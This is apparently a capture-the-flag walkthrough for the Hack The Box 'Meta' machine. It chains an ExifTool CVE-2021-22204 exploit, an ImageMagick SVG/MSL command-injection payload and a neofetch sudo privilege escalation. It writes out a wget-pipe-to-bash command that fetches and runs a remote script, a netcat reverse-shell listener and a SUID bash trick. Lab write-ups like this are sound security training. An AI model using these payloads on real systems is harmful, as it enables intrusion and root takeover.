```
We have a simple page in production phase, but it seems like it hasn't any mistake. Let's turn to subdomains enumeration to enumerate others existing virtual hosts.
```
sudo gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://artcorp.htb -t 200
```

There is a new subdomain: dev01.artcorp.htb add it to the /etc/hosts. Here is an image uploader which seems to use an application to extract all metadata from your image.

Exif Tool: An utility to extract all metadata from an image input.

### Exploit vulnerabilities
Looking for an exploit of this utility, we will find a CVE on [AssassinUKG's](https://github.com/AssassinUKG/CVE-2021-22204) github profile.

It will create a new metadata with a command in base64. ExifTool will interprete it as a php code. 
```
sudo ./exploit.sh "system('wget -qO- http://<tu_ip> | bash')" happy.jpg
```
You have to create a shared service with python `python3 -m http.server 80` and listen at 443 port `rlwrap nc -lnvp 443` to receive an interactive console.

### Migrating of user
Take a look of some execution process and get one that is executed as other user.
```
#!/bin/bash
process=$(ps -eo command)
while true; do
        new_process=$(ps -eo command)
        diff <(echo "$process") <(echo "$new_process") | grep "[\<\>]" | grep -vE "procmon|command|kworker"
        process=$new_process
done
```
>\> /bin/sh -c /usr/local/bin/convert\_images.sh
It is a script that use mogrify: Version: ImageMagick 7.0.10-36


Take a look of searchsploit there is one way to inject command in a file. Creating a .svg file will result in our payload being executed on the next cron execution
``` html
<image authenticate='ff" `whoami > /dev/shm/whoami.txt`;"'>
<read filename="pdf:/etc/passwd"/>
<get width="base-width" height="base-height" />
<resize geometry="400x400" />
<write filename="test.png" />
<svg width="700" height="700" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="msl:rce.svg" height="100" width="100"/>
</svg>
</image>
```
To see your directory every second use this command:
```
watch -n 1 ls -l /dev/shm
```
And there we go. You can be Thomas. Get his ssh private key and create a new conexion.


### Privilege Scalation
Check sudo permission with: sudo -l 
```
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```
Neofetch can be run as root without any password. Can we change the function of neofetch? Well. As you can see there is a `env_keep+=XDG_CONFIG_HOME`. Take a look what's this. `cat /home/thomas/.config/neofetch/config.conf | grep XDG_CONFIG_HOME`:
```
XDG_CONFIG_HOME="${XDG_CONFIG_HOME:-${HOME}/.config}"
    ...
    mkdir -p "${XDG_CONFIG_HOME}/neofetch/"
    ...
```
It seems like this variable defines what config file is preload on neofetch. So editing this variable as follow: `export XDG_CONFIG_HOME=/home/thomas/.config` and editing this config file to change the permission of a /bin/bash to set it SUID `chmod u+s /bin/bash`, we can get a bash as root `/bin/bash -p` (p indicate privilege mode).
Et voil√†! Congratulations.
